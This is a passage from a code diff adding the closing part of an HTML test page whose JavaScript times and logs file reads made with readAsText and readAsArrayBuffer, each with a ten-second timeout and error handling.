+                            results.text.status = 'success';
+                            results.text.data = data;
+                            results.text.time = Date.now() - methodStart;
+                            results.text.note = 'Read successfully (text only)';
+                            completed++;
+                            log('Method 4 (readAsText): SUCCESS - ' + data.length + ' bytes', 'success');
+                            updateResults();
+                        });
+                        setTimeout(function() {
+                            if (results.text.status === 'pending') {
+                                results.text.status = 'error';
+                                results.text.error = 'Timeout (10s)';
+                                results.text.time = Date.now() - methodStart;
+                                completed++;
+                                log('Method 4 (readAsText): TIMEOUT', 'error');
+                                updateResults();
+                            }
+                        }, 10000);
+                    } catch (e) {
+                        results.text.status = 'error';
+                        results.text.error = e.message;
+                        results.text.time = Date.now() - methodStart;
+                        completed++;
+                        log('Method 4 (readAsText): ERROR - ' + e.message, 'error');
+                        updateResults();
+                    }
+                })();
+
+                // Test Method 5: readAsArrayBuffer
+                (function() {
+                    var methodStart = Date.now();
+                    try {
+                        readFileAsArrayBuffer(testUrl, testFile, function(filename, data) {
+                            results.arraybuffer.status = 'success';
+                            results.arraybuffer.data = data;
+                            results.arraybuffer.time = Date.now() - methodStart;
+                            results.arraybuffer.note = 'Read successfully';
+                            completed++;
+                            log('Method 5 (readAsArrayBuffer): SUCCESS - ' + data.length + ' bytes', 'success');
+                            updateResults();
+                        });
+                        setTimeout(function() {
+                            if (results.arraybuffer.status === 'pending') {
+                                results.arraybuffer.status = 'error';
+                                results.arraybuffer.error = 'Timeout (10s)';
+                                results.arraybuffer.time = Date.now() - methodStart;
+                                completed++;
+                                log('Method 5 (readAsArrayBuffer): TIMEOUT', 'error');
+                                updateResults();
+                            }
+                        }, 10000);
+                    } catch (e) {
+                        results.arraybuffer.status = 'error';
+                        results.arraybuffer.error = e.message;
+                        results.arraybuffer.time = Date.now() - methodStart;
+                        completed++;
+                        log('Method 5 (readAsArrayBuffer): ERROR - ' + e.message, 'error');
+                        updateResults();
+                    }
+                })();
+            }
+        </script>
+</body>
+
+</html>
